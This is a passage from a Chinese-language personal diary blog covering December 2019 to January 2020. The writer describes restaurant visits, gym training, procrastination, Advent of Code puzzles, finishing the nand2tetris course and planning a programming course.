個人左右，那時店裡除了我們只有另外兩個客人，生意看起來沒有很好。但當我們離開時其實是坐滿的，看來是我低估它了。</p><p>這間餐廳標榜的是南印度料理，我要特別強調「南」這個字。因為一看到菜單，發現我所熟知的印度料理都沒有出現，例如說咖哩魚頭、naan 還有 prata，但也有可能只是換了個名字就是了。我對印度料理沒有很陌生，在新加坡吃過幾次，甚至有時候會吃 roti prata 當做早餐，也跟印度同事一起去吃過咖哩魚頭，味道還不錯。在法國的時候也跟朋友去吃了印度菜，至於為什麼去法國要吃印度菜，這我也不知道。我只知道去越南應該要吃法式料理，CP 值很高。</p><p>店員看我們看著菜單發呆了十分鐘，就主動跑過來問說要不要推薦。從講話的口音以及長相看起來，我推測是印尼人之類的，中文講得還不錯。這還是我第一次碰到這麼誠實的店員，推薦的時候直接講說：「這一頁的開胃菜我只推薦這個」，這一句的句眼在「只」這個字，意思就是其他的都不推薦。</p><p>既然店員都這麼誠懇的推薦了，就照她說的來點吧，我們最後點了炸薄荷花椰菜，雞肉咖哩、蔬菜咖哩還有忘記叫做什麼的餅，Y 跟 C 各點了一杯印度優酪乳（lassi），我原本想點奶茶的，但店員說奶茶有加薑，喔買尬，這到底什麼奶茶。加了薑的奶茶沒資格叫做奶茶吧！</p><p>在等上菜的時候我們看著電視上播的印度 MV，其實那些 rap 唸得滿好的，內容跟風格就跟其他國家的 MV 差不多，只是劇情有點老套，跟投幣式 KTV 會出現的伴唱帶有異曲同工之妙。</p><p>第一道上來的菜是米做的餅，aka 沒有蔥的蔥油餅，或是 C 乾脆簡稱為油餅，若是你喜歡蔥油餅的口感但不喜歡蔥，那這是一道非常適合您的佳餚。接著雞肉咖哩也很快地就上來了，身為一個高中二類組的學生，我專業地用了搧嗅法去聞了咖哩的味道。</p><p>「嗯，是我有聞過的味道」</p><p>『你聞了這麼久就只有這點心得嗎？』對不起，我的心得不像 C 的結業心得一樣寫了這麼多字。</p><p>接著蔬菜咖哩與另外一種小麥做的餅也上來了，你有吃過煎餃或是鍋貼嗎？煎完之後上面那一層金黃色的東西跟這個小麥餅八七分像，吃起來脆脆的，但是吃到最後有一種酸味，我也不知道為什麼。如果平常有在喝鹼性水的人應該很適合吃這個餅，可以順便酸鹼中和一下。</p><p>除了這兩種餅以外我們還點了白飯，是用盤子裝的而且還刻意堆疊成台灣的形狀，滿可愛的，不知道這模具要去哪裡買。如果有人知道去哪裡買的話，其實也不用告訴我，因為我不煮飯的。</p><p>要吃道地的印度料理，就要用道地的吃法，我們在一旁洗了手，用手撕著餅來吃。話雖如此，我們其實只是吃半套的而已，因為飯還是用湯匙而不是用手。不是我們不想，是我們不會。用手吃飯也是需要學習的，是一門技藝。</p><p>蔬菜與雞肉這兩種咖哩的味道差滿多的，顯然蔬菜的味道比較重一點，而且神奇的是我並沒有看到蔬菜，只有豆腐而已。此時 C 突破了盲點說道：「該不會蔬菜指的是素食的意思吧？」，一切都合理了，難怪裡面沒有蔬菜，原來是這個意思。</p><p>接著我們三人沈浸在咖哩與南印度風的餐廳之中，享用著桌上的咖哩，搭配著白飯與各種餅，不知道過了多久，飽足感漸漸出現，桌上的食物也清得差不多了。</p><p>到了結帳的時刻，我要大家猜猜看今天吃了多少錢，不含那兩杯飲料。C 猜 900，我就順勢猜了 1000，Y 則猜了 1100。原本我以為勝負只出現在我與 C 之間，與 Y 無關，沒想到拿到帳單時出乎我意料之外。居然是 1400 多！就算扣掉飲料，也是 Y 猜的數字比較接近，原來是全能估價王阿，失敬失敬。</p><p>不過這個價位比想像中的高就是了，我們也沒有點的太多，一人要接近 500 不是個友善的價格。最適合吃這間的時段應該是平日中午，有商業午餐可以點，好像只要兩百多而已，而且吃的還比較豐富。</p><p>結帳完離開這間店以後，我們討論著心得，一致覺得這間店很神奇。</p><p>那結論呢？</p><p>我們應該吃一樓的壽司店的。</p><h3 id="Day20：2019–12–15"><a href="#Day20：2019–12–15" class="headerlink" title="Day20：2019–12–15"></a>Day20：2019–12–15</h3><p>大概是因為昨天吃咖哩而且又會辣的緣故，一早起來肚子就不太舒服。下午的英文課突然很想請假不去，就在此時國中同學傳來了訊息，問說中午要不要吃飯，就一口答應了。</p><p>我們這一群同學有時候假日會組成 Google Map 調查隊，去嘗試一些在上面評價不錯的店家。但盡量不要選 4.8 顆星以上的，因為很有可能是公關公司洗評價的結果，找那種 4.5 或是 4.6 的，有很大的機率會比較好吃。因為同學會開車，所以都會找不在台北市區的景點，像今天就是特地跑到瑞芳去吃飯。</p><p>吃的這一間店叫做湘妹子，老闆很熱情，幫我們稍微介紹了一下，也有跟隔壁桌閒聊了一下，得知我們特地從中和跑過來，對方有點驚訝。原本賣的都是個人套餐，但若是多個人的話可以做成合菜的形式，每一道菜都滿好吃的，而且價格實惠，吃超級飽然後一個人才 250！不過整間店最令我印象深刻的是小菜的豆乾，真的好吃。</p><p>吃完以後就隨意找了附近的景點，去爬了某個登山步道，山上的溫度其實有點冷，而且風一直吹一直吹又更冷了。在走步道的時候大概是有點晚了而且又是比較無聊的景點，沒有什麼人在走，走到一半折返時就只有我們而已。</p><p>爬完步道以後就去吃晚餐，原本想去九份吃的，但人依舊多，只好改去暖暖那邊的餐廳，去吃了一間牛肉麵店，我覺得挺不錯的，而且牛三寶麵只要 100 塊而已！真的是超級經濟實惠。</p><p>今天就先寫到這裡吧，有點累了，早上十一點出門，晚上十點才到家。突然覺得日記好像要多一些個人情感的部分，不然好像都是純粹敘事，好像有點無聊？</p><h3 id="Day21：2019–12–16"><a href="#Day21：2019–12–16" class="headerlink" title="Day21：2019–12–16"></a>Day21：2019–12–16</h3><p>突然發現好像不用每天固定同一時間寫心得，應該在有心得的時候就跑來寫一寫，這樣才不會忘掉。</p><p>昨天為期八個月的程式導師實驗計畫結束了，看到有同學說沒什麼真實感，其實對我來說也沒什麼真實感，居然就這樣結束了。總覺得八個月不該過的這麼快才對，計畫開始的時候差不多是我離職的時候，計畫結束也代表我的假期結束了。</p><p>對於這個計畫，每一次結尾的時候都會感到興奮，一來對於那些學生的未來發展感到興奮，二來對於下一期的計畫感到興奮，因為每一次都會發現很多可以改良的地方，計畫會變得愈來愈好，也愈來愈完整。</p><p>今天就不寫在做什麼了，來寫一下閉關的心得感想吧。</p><p>目前的感想就是閉關真的要閉得徹底，不然會是件很麻煩的事。例如說昨天跟國中同學出去玩，導致今天睡到很晚而且超級累，昨天一天也什麼事情都沒做，雖然只是一天而已，但重點是昨天那一天「破壞了整個日常的作息」，要調整回來又需要一兩天的時間，這樣來來回回三四天就去掉了。</p><p>有些朋友在閉關唸書的時候基本上不見什麼朋友，但也有些人覺得反正飯還是要吃，約個吃飯是可以的。我現在滿懂前者的心態了，雖然說一定有時間跟朋友吃飯沒錯，但重點是這一頓飯打壞了原本的生活節奏，一旦亂了，就要再花時間調整回來。</p><p>但要閉得徹底也是一件難事吶，真的要把所有聯絡管道都關掉，找個沒人認識你的地方，才有可能達到真正的閉關。</p><h3 id="Day22：2019–12–17"><a href="#Day22：2019–12–17" class="headerlink" title="Day22：2019–12–17"></a>Day22：2019–12–17</h3><p>閉關的狀態恢復得差不多了，可以專心地開始做點事。</p><p>今天在家裡稍微練習了一下深蹲，還是抓不太到感覺，總覺得還是膝蓋那邊在出力，嚴重懷疑跟我本來就蹲不太下去有關，導致出力的位置不對，或是如果硬要用正確的地方出力就會跌倒之類的。等明天再讓 Alex 大大幫我看一下好了。</p><p>原本晚上想出去跑步的，但一想到明天還要去訓練就想說算了吧，之後再去。其實一開始閉關就應該把跑步納入行程裡面的，可是又拖延了。從明天開始好像會一直下雨，到時候又會更不想去了吧。哭哭，拖延症還是在。閉關是月初開始的，現在已經兩個多禮拜了，其實整體狀況感覺還行，雖然還是有拖延的狀況發生，但我相信會越來越好。</p><p>晚餐吃了家裡附近的鹹水雞，覺得熱量應該不會太高，但不知道為什麼要放一些很難啃的雞翅膀在裡面，不知道用意為何，是為了增加進食的難度嗎？不過鹹水雞比起滷味跟炸物，在我家附近滿少見的，方圓兩三公里以內應該就只有這家了。</p><p>中午一樣吃了鐵板燒，是我認為控制熱量滿好的選擇（應該是吧，明天再問一下教練），畢竟就是兩樣青菜+主菜雞腿+白飯，整體下來應該營養滿均衡的都有顧到。而且開店的夫妻態度很好，很喜歡他們的服務態度。</p><p>AoC 難度持續變高，但幸好 part1 都還解的出來，決定一天只能花兩小時在上面，不然其他事情都不用做了。趁著對新課程有靈感時趕快記錄下來，好想趕快開課。</p><h3 id="Day23：2019–12–18"><a href="#Day23：2019–12–18" class="headerlink" title="Day23：2019–12–18"></a>Day23：2019–12–18</h3><p>早上在耍廢，什麼事都沒做。醒來發現天氣變冷了，而且外面正在下著雨，還是喜歡之前的晴天。</p><p>中午自己煮了午餐來吃，三顆蛋加鮪魚罐頭，然後燙了青菜，怕青菜太沒有味道於是加了之前買鍋貼沒有用到的醬，意外地滿搭的，看來鍋貼醬應該跟什麼都很搭。下午認真地把 nand2tetris 第五章看過一次然後開始寫作業，雖然看起來很難，但實際動手下去做會發現沒有想像中的難，不過倒是有滿多點要留意的。</p><p>大概寫了一兩個小時左右，作業五就順利完成了，完成 CPU 的當下超興奮的，想說：哇！居然真的被我弄出來了，但另一方面也有點小不安，因為心裡默默覺得：「可是我怎麼弄出來的…」，好像是隨便兜兜，但你要我講出完整的執行流程，我可能講不出來，這樣真的有學會嗎？</p><p>既然作業五完成了，就順便把第六章看一看好了，這也是這堂課的最後一個章節了，是要寫一個 assembler，把 HACK 的 assembly code 轉成 machine code。我原本以為是要用 assembly code 來實做之類的，想說靠杯也太難，後來發現只要能做出來就好，就選了我擅長的 JS 語言。</p><p>還有一個有趣的點是為了造福不會寫程式的人，作業還提供了另一種方式，那就是手動轉譯，你直接用人腦充當 assembler 也可以。這點滿值得學習的。</p><p>assembler 其實滿容易的，因為語法很簡單，也沒有什麼複雜的邏輯，最麻煩的大概就是把 label 還有 symbol 換成實際位置而已。快速寫完之後交作業，60 分，還來不及檢查為什麼就趕著出門去健身了。</p><p>今天練的運動是深蹲還有拿著啞鈴的深蹲以及另一個抱著啞鈴的深蹲，忘記這動作叫什麼了。發現腳打開很多真的滿容易蹲的，終於把姿勢慢慢做對。但蹲個十幾下就快掛了，累爆，我腿真的爛。</p><p>另一個動作是臥推，先推啞鈴，但沒什麼抓到感覺，再來直接推沒有放槓片的槓鈴，沒想到那個也有 20 公斤左右，比我想像中的還重。推一推還是沒有太大感覺，不過手倒是滿快就酸了。</p><p>總之呢，一個小時以後再度帶著疲憊的身體回家，十分滿足。</p><p>回家以後繼續 debug 60 分的作業，發現是取代字串的地方出了錯，找到錯誤點然後改正以後就 100 分了，然後就收到 coursera 寄來的證書通知，順利拿到人生第一張線上課程的證書。真是可喜可賀，可喜可賀。要找時間來寫這門課的心得，推廣給更多人知道。</p><h3 id="Day24：2019–12–19"><a href="#Day24：2019–12–19" class="headerlink" title="Day24：2019–12–19"></a>Day24：2019–12–19</h3><p>今天的 AoC 不難，沒有花太多時間就解開了。</p><p>下午本來想耍廢，但解完 AoC 發現才兩點多而已時間還早，就開始乖乖看英文課補課的影片，用 1.5 倍速來看，順便跳過一些閒聊的地方想省時間，看補課影片跟實際上課的感覺真的滿不一樣的，實體上課還是比較好，印象會比較深刻，精神也比較好。</p><p>看完之後順便寫課程心得，其實這規劃還滿不錯的，趁著記憶猶新的時候最好寫心得了，不然拖一陣子的話又會忘掉。</p><p>晚上就是回家吃飯，沒什麼特別的。</p><p>今天檢視了一下昨天重訓完後痠痛的地方，下半身是大腿後側靠近屁股的地方，以及大腿內側靠近膝蓋的地方，後者這個位置好像不太對，懷疑是我深蹲時重心還是有點前面然後用了不太對的地方支撐。上半身就是胸部上側靠肩膀的地方，應該差不多就是這裡。其實肌肉痠痛的感覺滿好的，因為會覺得自己有在做事。如果因為痠痛而不運動還可以幫自己找理由。</p><p>喔對了，下午 po 了 Medium 的期末特別活動，想要贈書給讀者。好像是昨天晚上突然想到這個企劃的，想說滿好奇讀者的心得，也想順便接觸看看讀者，那就順便送書吧，有個禮物的感覺應該滿不錯的，有了大致的雛形以後就開始寫文章了，邊寫邊想說要怎麼弄。原本想要讓大家填 Google 表單，後來發現長度如果比較長表單其實很不方便，於是就改成直接寫信了。</p><p>文章才 po 出去，今天就收到兩封信，不過會讓人覺得說手腳有必要這麼快嗎，怎麼不等個幾天醞釀一下靈感再寫哈哈，但也有可能看到文章的當下最有靈感，就寫一寫寄信過來了。如果活動辦得不錯，乾脆每年都來一次好了。</p><h3 id="Day25：2019–12–20"><a href="#Day25：2019–12–20" class="headerlink" title="Day25：2019–12–20"></a>Day25：2019–12–20</h3><p>今天是個耍廢的一天。</p><p>想說這個禮拜進度不錯，下午就開始耍廢。有稍微再看了一下 nand2tetris 記錄一下心得，但其他時間都在看 YouTube 耍廢，哭哭。</p><p>看到朋友推薦一個活動叫做十日禪，到山上的某個禪修中心靜修十天，看起來滿特別的，但也很有挑戰性，十天都不能講話對我來說還好，但要吃素外加到後期要坐著不動，這個應該比較辛苦。不過我覺得有一天可能會想去參加，然後在 Medium 上面寫心得。</p><p>晚上去家教，滿喜歡約的那一間咖啡廳，人不會太多所以不會吵，東西又滿好吃的。不過比較苦惱的是要怎麼帶對於程式基礎邏輯很不熟的新手，可能從頭開始帶著寫題目或是直接講解會比讓對方自己想還要快速。</p><h3 id="Day26：2019–12–21"><a href="#Day26：2019–12–21" class="headerlink" title="Day26：2019–12–21"></a>Day26：2019–12–21</h3><p>約會日，毫無進度的一天。</p><h3 id="Day27：2019–12–22"><a href="#Day27：2019–12–22" class="headerlink" title="Day27：2019–12–22"></a>Day27：2019–12–22</h3><p>最近幾天的日記愈來愈偷懶了，很多都是輕描淡寫帶過或者是隔天再補。</p><p>但是是真的沒有時間嗎？不是的，只是定不下來而已。寫一篇日記頂多十分鐘到半個小時，花不了多少時間，難的是要克服想做其他事情的衝動（對，就是這麼容易被其他事情吸引），例如說花五分鐘寫一寫結果就跑去看 YouTube 什麼的。做其他事情永遠比做正事重要，怎麼閉關以後這點還是沒有變。</p><p>我覺得目前做事的重心好像可以轉移了，先從自我成長轉移到新課程，因為之前提到的那些課程想法有很多人在敲碗，而且馬上就要年底了然後農曆過年，這段時間太多假期太多誘惑，感覺就會開始繼續偷懶？所以做些比較簡單的事情好像會比較容易？不知道，我再想想看好了。</p><p>阿，話說這一篇是隔天補的，所以會用昨天來形容現在這一篇。昨天晚上的時候又去重訓了，這次試著做做看硬舉，覺得應該要找時間把那些動作的重點筆記下來，不然總有一天會忘記。早上量體重發現又掉了一點，覺得真的很神奇。</p><p>不是說 7700 大卡大約等於一公斤嗎，那到底哪邊用到這麼多的熱量，覺得不解。不過開始比較關注飲食熱量之後，好像有慢慢瘦下來。</p><p>話說我之前也有想過要不要改成寫周記就好，一週一篇好像品質能比較好，但另一個問題是很多當下想記錄的心得搞不好會忘記，仔細想想也不一定是件好事。應該要先從之前想過的一個解法開始，就是每天固定一個時段寫日記，培養一種儀式感之類的，例如說晚上十一點到十一點半，寫完就睡覺。或乾脆隔天早上才寫昨天的日記，搞不好經過一個晚上的沉澱會更有想法。</p><h3 id="Day28：2019–12–23"><a href="#Day28：2019–12–23" class="headerlink" title="Day28：2019–12–23"></a>Day28：2019–12–23</h3><p>又是個偷懶的一天。</p><p>下午兩三點意識到自己大概會偷懶一整天的時候，就乾脆換了個做法，那就讓今天盡情拖延吧。去感受那個拖延的罪惡感，然後看看自己會有什麼不同。一整天過去以後，結論是好像也沒什麼不同，搞不好已經習慣這種感受了。怎麼聽都不是一件好事。</p><p>甚至一度還有想法：「乾脆今年剩下的幾天也拖延好了」，但如果真的做了，大概明年也會繼續拖延吧。拖延症這種東西不是你幫自己設一個死線就會消失了。</p><p>有鑑於此，一度想說可以繼續用一個對自己很有效的招數，就是靠著其他人幫你前進。我想說可以對外 po 文，每天都要更新做課程的進度，然後給自己一個死線，在這個時間以前要完成課程，如果真的做不完至少進度要有七八成之類的。好，如果之後還是拖延就用這招，畢竟這招對我來說真的很管用。</p><p>明天就是平安夜了，再來是聖誕節，其實沒什麼特別感覺，不知道從什麼時候開始就沒什麼在過節了，每天都過得差不多其實也不錯，就跟在新加坡的日子一樣。</p><p>下午跟晚上都弄了煎餃來吃，不知道是我真的太爛還是這次買的水餃不適合，試了幾次都沒成功，這次還皮肉分離，皮留在了鍋子上，估計是油放得不夠多吧，火好像也開的有點太大。</p><p>因為這幾天實在太廢，決定明天去拖延症救星：小樹屋報到，要挽回一點進度。</p><h3 id="Day29：2019–12–24"><a href="#Day29：2019–12–24" class="headerlink" title="Day29：2019–12–24"></a>Day29：2019–12–24</h3><p>昨天晚上躺在床上的時候才發現自己忘記寫日記了。</p><p>平安夜，但卻沒有什麼特別的感覺。只在推特上面發了一個廢推，說工程師玩什麼交換禮物，交換 bug 比較好玩，然後就被一堆人轉推加上按愛心，讚讚讚。</p><p>由於前幾天實在是太廢了，只好跑去小樹屋找回認真的自己，順便與千聊了一下她之前去十日內觀的心得，雖然說聽起來真的滿令人卻步，但真的很有挑戰性，整個十天都很有挑戰性，無論是吃素、早起、打坐或者是不能講話，都很有很有挑戰性。我真的覺得有一天我會想嘗試看看，應該會是在閉關修煉的這一年裡面，如果超過這一年就麻煩了，而且好像不太適合。</p><p>晚上吃了鼎鼎大名的池先生馬來料理，點了海南雞飯，跟我在新加坡吃到的差不多，不過對於價錢不是很滿意。事情是這樣的，在新加坡吃台灣料理的時候，你會覺得特別貴，例如說一杯珍奶可能要一百多塊，但當地的物價就是這樣，所以新加坡人喝珍奶可能不會覺得有什麼。我會覺得貴是因為我拿台灣當地的價格來比。</p><p>海南雞飯也是這樣，在台灣算是異國料理，但對於在新加坡待了兩年半的我來說是家常便飯，新加坡吃這個大概一百多塊，但池先生要一百六十，所以自然而然我會覺得貴，不過對其他人來說或許就不會有這麼深刻的感受。總之呢，味道滿道地的，只是 kaya toast 沒有想像中的甜。</p><p>雖然說晚上在小樹屋都在閒聊沒做什麼事，但是在白天的時候繼續整理之後要開的課的課綱，覺得整理的差不多了，可以再找時間跟其他同學討論看看，看他們覺得怎麼樣。之後錄起來應該又是一件麻煩的事，但一想到這個課程終於要成形，還是覺得異常興奮。</p><h3 id="Day30：2019–12–25"><a href="#Day30：2019–12–25" class="headerlink" title="Day30：2019–12–25"></a>Day30：2019–12–25</h3><p>聖誕節，沒什麼特別的感覺。不過今天知道了一個小知識，原來聖誕節不是耶穌生日。</p><p>中午繼續寫 AoC，找一些覺得自己可以解出來的題目，寫了 Day20 的傳送問題，會選這題是因為以前有解過類似的，就 BFS 一下就好，寫完之後有 bug，稍微 debug 然後改了一下之後就 AC 了，看來 BFS 還沒完全忘光。</p><p>Part2 比較難一點，但看一看之後也馬上就有想法，其實就只是 BFS 多了一個參數而已，快速研究然後 debug 一下之後終於 AC 了，看到 AC 那一刻超爽的，太神辣！</p><p>下午還去全聯買了一下東西，晚餐就吃豆乾跟蘋果麵包，因為突然很想吃蘋果麵包。吃完其實有點餓，還是應該吃雞胸肉的。晚上去重訓，對於硬舉還是不太熟悉，起來的動作還是沒有很熟悉。覺得很多動作好像跟我蹲不太下去都有關，之後再好好研究看看。</p><p>運動完頗累而且有點餓，在便利商店隨便買了一罐草莓燕麥，因為只有他熱量在 100 大卡左右而且感覺不會完全不健康，滿好喝的。疲憊的一天，明天要來寫 from nand to tetris 的心得了。</p><h3 id="Day31：2019–12–26"><a href="#Day31：2019–12–26" class="headerlink" title="Day31：2019–12–26"></a>Day31：2019–12–26</h3><p>昨天居然又忘記寫心得了…</p><p>昨天大多數時間都在寫週六要在 TechBridge blog 發表的文章，因為有把文章完成，目標有達到，所以其餘的時間都在耍廢。最近的日子過得好快，聖誕節也是一下就過去了，新的一年馬上就要來了，然後再過兩三週就要過年了，就二月了。年底的日子總是這樣的，咻一下就過了。</p><p>晚上依舊去家教，約的那間咖啡廳我真的滿喜歡的，我覺得東西不錯，店裡播的韓國歌曲我也很喜歡，最重要的是都沒什麼人，一點都不吵。我要把這間咖啡廳列入推薦清單裡面。</p><p>睡覺前跟女友在討論之後出國的事，因為想把新航的里程用掉，所以想去一趟新加坡，然後也想去一趟日本，就在想到底什麼時候去。目前還沒討論出什麼結論，就再看看吧。</p><h3 id="Day32：2019–12–27"><a href="#Day32：2019–12–27" class="headerlink" title="Day32：2019–12–27"></a>Day32：2019–12–27</h3><p>今天在課程的製作上有了一些進度，在試圖解決兩個問題：</p><p>怎麼批改作業、怎麼讓大家有衡量標準，知道自己要修這門課？ 針對第一點，我原本想比照 nand2tetris，提供題目的輸入與輸出，讓學生們自行比對程式是否正確，優點就是可以支援每一種語言，缺點就是比較不方便而且一定要會讀寫檔案，但其實也沒什麼不好的。</p><p>最完美的解決方案應該會是自己寫一個 online judge system，但這個需要的時間有點多，而且要支援各個語言也是一件麻煩的事，所以暫時不考慮。不過除了這兩個選項，今天還想到另外一個，就是把題目發到 codewar 上面去，依賴他人的平台。</p><p>所以後來就寫了兩封信，一封給 codewar 問說能不能發中文題目，另一封給 NPSC 問說題目的使用規範，看看能不能把題目發到其他網站上。希望一切順利。</p><p>至於那個標準，其實也是差不多的，我想要提供大概五題的題目，題目來源會從 NPSC 那邊抓，如果你沒有認為這五題「很簡單」，那你就很適合這一堂課。相對地，若是有一天你覺得這五題很簡單了，就代表你順利從這門課程畢業了。</p><h3 id="Day33：2019–12–28"><a href="#Day33：2019–12–28" class="headerlink" title="Day33：2019–12–28"></a>Day33：2019–12–28</h3><p>依舊是沒做什麼事的一天。</p><p>主要是稍微再改了一下程式課程的大綱，看起來愈來愈完整了。但可怕的是越接近完整，我就會越拖延了，大概是抱著「反正只要再一下就好了」的心態去做事吧，就會先把時間用在其他地方，反正只要再一下就好了。而也正是這種心態，讓最後一哩路變得無限遙遠，就這樣拖著拖著，不知道拖到了什麼時候。</p><h3 id="Day34：2019–12–29"><a href="#Day34：2019–12–29" class="headerlink" title="Day34：2019–12–29"></a>Day34：2019–12–29</h3><p>買了去新加坡的機票。</p><p>主因是我想把新航哩程用掉，不然就快要過期了。雖然我也沒有多少哩程，但是這樣折抵下來還是可以折個三四千左右，其實也是不少。女朋友要一起去，於是就直接買了兩人份的機票。原本想說去那邊見見朋友跟以前同事，但現在要重新想一下了，畢竟這些都是我個人的飯局，怕女友會不知道要幹嘛然後很無聊，再找時間想想看吧。</p><p>然後也買了去日本的機票。</p><p>因為我日航 JGC 會員每年第一次飛日本都會有優惠哩程，再加上剛好看到去名古屋的機票特價，來回才 7500 而已。唯一的缺點就是時間不夠好，禮拜三晚上到，禮拜六早上就走了，禮拜天的機票直接貴 2400 元，思考了一整個晚上加早上之後還是把機票訂下去了。</p><p>很多事情真的都需要一股衝動。</p><p>英文課因為不想玩交換禮物所以請了假，晚上的健身也因為不想冒雨出門而請了假，前者沒什麼特別的，後者倒是滿有罪惡感。這種罪惡感就跟拖延症一樣，感覺都是差不多的，事後都有一種「我在幹嘛…為什麼要這樣」的感覺，但誠實地說，我還不知道如何與這種感覺共處。我不知道我應該無視他，還是擁抱他，還是乾脆就不要拖延。</p><h3 id="Day35：2019–12–30"><a href="#Day35：2019–12–30" class="headerlink" title="Day35：2019–12–30"></a>Day35：2019–12–30</h3><p>今天下午沒事做，跟 AoC 的其中一題再次奮戰，嘗試用 BFS 來解了一下發現狀態太多，完全沒辦法搜，除非地圖很小。換個方法用 DFS 然後 call stack 就爆炸了，改成用 stack 終於有成功把地圖走完，但是還是沒辦法求出最佳解。</p><p>有額外想了一些方法但都還是掛掉，最後去看了別人的答案看到了熟悉的眼算法，哇咻。</p><p>晚上把 AoC 第 22 天的題目解掉了，原本就覺得不難只是懶得做，沒想到一做大概半小時左右就完成了，看來我真的是懶得沒藥醫…應該找時間來把 AoC 的解法集合一下然後 po 出去了。</p><p>明天是今年最後一天了，下午要下台中去陪女友跨年，在車上可以來聽頂樓加蓋了。</p><h3 id="Day36：2019–12–31"><a href="#Day36：2019–12–31" class="headerlink" title="Day36：2019–12–31"></a>Day36：2019–12–31</h3><p>搭了自強號去台中找女友，超級久沒搭火車了。</p><p>上次搭火車應該是從高鐵台南站到台南火車站去好想工作室，再上次可能是四五年前從台北搭火車到恆春了。不知道為什麼，總是對台灣的火車有些抗拒，如果有別的交通方式就不會選火車。我也不知道為什麼，真的。</p><p>這次選火車一方面是因為很久沒搭了，另一方面是怕塞車，還有就是住的地方剛好在臺中車站附近，搭火車顯然是最方便的選擇。原本要在火車上面聽頂樓加蓋，但是火車的噪音有點大，我又不想開太大聲，於是聽一聽就作罷了。</p><p>晚上就是跟女友在台中車站附近那一帶走走，去了大魯閣新時代逛逛，投了籃球機，唱了可以用 LINE pay 的電話亭 KTV，然後在飯店一起看著跨年節目跨年。很平淡的一天，但很幸福。</p><h3 id="Day37：2020–01–01"><a href="#Day37：2020–01–01" class="headerlink" title="Day37：2020–01–01"></a>Day37：2020–01–01</h3><p>新年第一天，中午在台中市區晃晃，順便路過了傳說中的台中女中，吃了好像很有名的台中肉員。我說，這好像是我第一次吃肉圓，女友整個嚇到，說她很驚訝，跟她之前知道我高中是理組的時候一樣驚訝。</p><p>由於早上已經吃了肉圓，中午晃了許久還是不知道吃什麼，就去吃了麥味登，畢竟吃其他的很有可能吃不完。中午搭火車到新烏日火車站，然後搭了高鐵回台北，1&#x2F;1 還有公車真是太好了。</p><p>晚上一樣去健身，元旦也不休息。練的狀況好像有漸入佳境了，至少深蹲的時候不會蹲一蹲就覺得快掛了。健身完以後有點餓，吃了上面寫說只有 200 多大卡但我不太相信的麻辣鴨血臭豆腐。</p><p>阿對了，今天還做了一件很重要的事啦，下午把之前 Medium 我 po 的贈書活動的信回完了，大概有十個人寄信，最後送出了 5 本書，不過苦惱的是到底要怎麼挑那個書，目前偏向送一些小說或是文學類的東西，好像比較不雷？因為如果送一些很實用的，說不定對對方來說一點都不實用，例如說明明對商業沒興趣就送了商業的書籍之類的，總之之後再想想吧。</p><h3 id="Day38：2020–01–02"><a href="#Day38：2020–01–02" class="headerlink" title="Day38：2020–01–02"></a>Day38：2020–01–02</h3><p>我想創業。</p><p>不過跟你想像中的創業可能不太一樣，我不想發大財。比起創業，其實更貼近的詞是：「我想開公司」，開公司的目的只是為了開發票以及督促自己。對，我這個人就是很靠腰，沒有人逼就不會做事情，與其自己在那邊閉關耍廢，不如開間公司讓自己每個月都在燒錢，因為會燒錢，所以就不能不做事，經濟上的壓力總是最有用的。</p><p>其實以前就想開公司了，但一直沒有下定決心，想說等到三四年以後，在海外打拼一番再回來公司。但我不想等了，為什麼要等？想做的事情，不馬上做就來不及了。</p><p>我要創業。</p><h3 id="Day39：2020–01–03"><a href="#Day39：2020–01–03" class="headerlink" title="Day39：2020–01–03"></a>Day39：2020–01–03</h3><p>今天晚上跟幾個朋友去看了聲名遠播的「貓」，是一部看過的人都會給負評的電影。比較特別的是看的地點選在新開幕的 MUVIE CINEMAS，座椅還滿特別的，比較像是皮革沙發那種座椅而不是普通的電影椅，整個電影院都很新，但去看的廳沒有特別大就是了。</p><p>看完之後其實我是覺得比想像中好看啦，因為真的想得太差了，不過整體而言還是不好看就是了，看到中間差點睡著。</p><p>看完以後去市政府附近的居酒屋吃飯喝酒，一路從十點多吃到快一點，吃完之後有兩個朋友還續攤，我跟另外一個則是騎 ubike 各自回家，有 ubike 真是棒，雖然說要騎三四十分鐘，但至少一定回的了家，不需要搭計程車。</p><h3 id="Day40：2020–01–04"><a href="#Day40：2020–01–04" class="headerlink" title="Day40：2020–01–04"></a>Day40：2020–01–04</h3><p>完全忘記在做什麼的一天。</p><h3 id="Day41：2020–01–05"><a href="#Day41：2020–01–05" class="headerlink" title="Day41：2020–01–05"></a>Day41：2020–01–05</h3><p>今天下午參加了同學辦的謝師宴，十分感謝各位同學。但其實主要就是再揪大家來見面聊聊，聊完以後順便開了課程的檢討會，直接問大家每一週學習的時候哪邊有碰到問題。</p><p>檢討會結束以後去吃了飯，又去了小樹屋。</p><p>寫到這裡我突然發現為什麼我對寫日記這件事情興趣缺缺了，因為一旦固定了以後，就變成一種例行公事，就變成每天都要寫的東西，而不是我想寫就寫，不想寫就不寫，整個意義就不一樣了。</p><p>不過或許也只能繼續強迫自己吧，強迫自己每天還是寫一下東西，把心得記起來？</p><h3 id="Day42：2020–01–06"><a href="#Day42：2020–01–06" class="headerlink" title="Day42：2020–01–06"></a>Day42：2020–01–06</h3><p>今天終於把拖很久的贈書活動給搞定了。</p><p>書寄來了，去買了卡片以及泡泡袋，原本想去郵局寄書但是人太多了，一怒之下直接改用 711 的黑貓寄。原本我以為在網路上印好資料，可以直接拿去 711 貼，沒想到 711 那個盒子上面已經有自己的資料了，只好在那邊把所有資料重寫一次。</p><p>雖然只有三本書，但還是挺擔心寄錯地方的…</p><p>把這件事情搞定，心裡的一個大石頭放下了，接下來明天要去六角請益了。</p><h3 id="Day43：2020–01–07"><a href="#Day43：2020–01–07" class="headerlink" title="Day43：2020–01–07"></a>Day43：2020–01–07</h3><p>早上搭了高鐵，大概十一點左右到高雄，就搭捷運前往六角的辦公室。</p><p>去那邊聊了一個下午，聊得很多，聽了很多滿有用的建議，其中最有用的大概就是這個：「可以先訂一個目標，例如說年營業額 300 萬，有達到這個目標再去開公司」，聽起來好像還滿合理的。</p><p>晚上是跟 OJ 奮戰的一天，終於把 OJ 弄好了。</p><h3 id="Day44：2020–01–08"><a href="#Day44：2020–01–08" class="headerlink" title="Day44：2020–01–08"></a>Day44：2020–01–08</h3><p>繼續跟 OJ 奮戰，終於架起來了，覺得 docker image 其實還真的滿方便，因為基本上不會碰到任何問題，環境設置的問題都解掉了。</p><p>再來是 NPSC 